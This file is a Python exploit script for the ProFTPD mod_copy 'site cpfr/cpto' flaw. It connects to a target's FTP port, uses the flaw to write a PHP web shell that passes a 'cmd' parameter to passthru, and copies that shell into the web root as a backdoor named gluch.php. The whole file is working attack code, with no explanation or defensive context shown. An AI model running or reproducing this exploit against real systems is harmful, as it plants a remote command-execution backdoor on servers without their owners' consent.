import socket
from dotenv import load_dotenv
import os

class Exploit:

    def __init__(self, host, port, path):
        self.host = host
        self.port = port
        self.path = path
        self.sock = None
        pass

    def connect(self):
        try:
            self.sock = socket.create_connection((self.host, self.port))
            self.sock.recv(1024)
            return True
        except Exception as e:
            print(f"No se pudo conectar. {e}")
            return False
        
    def send_command(self, command):
        try:
            self.sock.sendall(command.encode('utf-8'))
            res = self.sock.recv(1024).decode('utf-8')
            return res
        except Exception as e:
            print(f"Error al enviar el comando: {e}")
            return None
        
    def exploit(self):

        payload = "<?php echo passthru($_GET['cmd']); ?>"

        self.send_command(f"site cpfr /proc/self/cmdline\n")
        self.send_command(f"site cpto /tmp/.{payload}\n")

        self.send_command(f"site cpfr /tmp/.{payload}\n")
        res = self.send_command(f"site cpto {self.path}\n")


        if "Copy successful" in res:
            print(f"Ok")
        else: 
            print(f"failed: {res}")

    def run(self):
        if self.connect():
            self.exploit()


if __name__ == "__main__":
    load_dotenv()
    FTP_EXPLOIT_TARGET_IP = os.getenv("FTP_EXPLOIT_TARGET_IP")
    backdoor_path = "/var/www/html/gluch.php"
    exploit_port = 21

    exploit = Exploit(FTP_EXPLOIT_TARGET_IP, exploit_port, backdoor_path)

    exploit.run()
    